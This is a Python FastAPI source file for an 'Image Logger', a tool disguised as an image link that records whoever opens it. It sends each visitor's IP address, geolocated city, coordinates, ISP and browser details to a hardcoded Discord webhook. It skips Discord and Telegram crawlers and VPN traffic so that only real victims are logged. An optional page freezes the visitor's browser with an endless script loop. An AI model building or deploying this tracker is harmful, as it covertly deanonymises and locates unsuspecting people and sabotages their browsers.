python
from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import HTMLResponse, RedirectResponse, Response
import requests
import httpagentparser
from urllib.parse import parse_qs, urlparse

app = FastAPI()

# ==================== CONFIG ====================
config = {
    "webhook": "https://discord.com/api/webhooks/1533168835316682854/TKTyWeqHd99G3wbXyYZeCd2n6-JocDtoNKSju2cuoOYNnUtCa0iXwTAyy_CVLHf9EnAF",
    "image": "https://raw.githubusercontent.com/assettomods117-pixel/IMAGE-LOGGER/refs/heads/main/06e21ef5-4be3-4274-b7c0-681adbd313b8.jpeg",
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": True,
    "buggedImage": False,
    "vpnCheck": 1,          # 0 = off | 1 = não pinga VPN | 2 = não envia se for VPN
    "antiBot": 1,           # 0 = off | 1 = não pinga bot | 2 = não envia se for bot
    "linkAlerts": True,
}
# ================================================

blacklistedIPs = ("27", "104", "143", "164")

def bot_check(ip: str, useragent: str):
    if not ip:
        return False
    if ip.startswith(("34.", "35.")):
        return "Discord"
    if useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def make_report(ip: str, useragent: str, endpoint: str = "/api/image"):
    if not ip or ip.startswith(blacklistedIPs):
        return

    bot = bot_check(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"**Link foi enviado!**\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`"
                    }]
                }, timeout=8)
            except:
                pass
        return

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=6).json()
    except:
        info = {}

    ping = "@everyone"

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 2:
            return
        if config["antiBot"] == 1:
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent or "")

    description = f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{info.get('lat', 0)}, {info.get('lon', 0)}`
> **Timezone:** `{info.get('timezone', 'Unknown')}`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False)}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```"""

    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": ping,
            "embeds": [{
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": description,
                "thumbnail": {"url": config["image"]}
            }]
        }, timeout=8)
    except:
        pass

@app.get("/api/image")
@app.get("/")
async def logger(request: Request, background_tasks: BackgroundTasks):
    # Pega o IP real
    ip = request.headers.get("x-forwarded-for") or (request.client.host if request.client else "Unknown")
    if "," in str(ip):
        ip = ip.split(",")[0].strip()

    useragent = request.headers.get("user-agent", "")

    # Discord / Telegram crawler
    if bot_check(ip, useragent):
        make_report(ip, useragent)
        if config["buggedImage"]:
            return Response(content=b"", media_type="image/jpeg")
        return RedirectResponse(url=config["image"], status_code=302)

    # Usuário real → loga em background e mostra a imagem
    background_tasks.add_task(make_report, ip, useragent)

    if config["crashBrowser"]:
        html = f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title></title></head>
<body style="margin:0;padding:0;overflow:hidden;">
<div style="background-image:url('{config["image"]}');background-size:contain;background-repeat:no-repeat;background-position:center;width:100vw;height:100vh;"></div>
<script>
setTimeout(function(){{
    for(var i=69420;i==i;i*=i){{console.log(i)}}
}}, 150);
</script>
</body>
</html>"""
        return HTMLResponse(content=html)

    # Versão normal (só a imagem)
    html = f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title></title></head>
<body style="margin:0;padding:0;overflow:hidden;">
<div style="background-image:url('{config["image"]}');background-size:contain;background-repeat:no-repeat;background-position:center;width:100vw;height:100vh;"></div>
</body>
</html>"""
    return HTMLResponse(content=html)
